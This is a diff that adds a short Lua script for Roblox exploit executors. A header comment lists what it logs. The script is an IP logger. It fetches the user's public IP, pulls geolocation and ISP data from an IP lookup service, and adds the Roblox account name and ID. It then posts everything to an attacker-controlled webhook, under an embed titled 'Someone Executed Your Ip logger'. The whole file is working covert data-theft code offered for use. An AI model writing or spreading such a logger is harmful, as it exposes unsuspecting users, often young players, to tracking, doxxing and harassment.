@@ -1,0 +1,47 @@
+--[[this will log: 
+query
+ip
+continent
+country
+roblox account name
+roblox account id
+if the user are in mobile
+zip
+latitude
+longitude
+timezone 
+currency
+ip
+proxy(if possible)
+internet provider
+Internet service provider
+internet protocol
+internet protocol name]]
+
+
+local check =
+   syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl"
+local UserIp = game:HttpGet("http://api.ipify.org")
+local url =
+   "webhookurl"
+local data = {
+   ["content"] = "Account name: "..game.Players.LocalPlayer.Name.." Id: "..game.Players.LocalPlayer.UserId,
+   ["embeds"] = {
+       {
+           ["title"] = "**Someone Executed Your Ip logger😱**",
+           ["description"] = "\nExploit: **"..check.."**".." \n ip: "..game:HttpGet("http://api.ipify.org").. "\n More info: \n"..game:HttpGet("http://ip-api.com/json/"..UserIp),
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7329da)
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
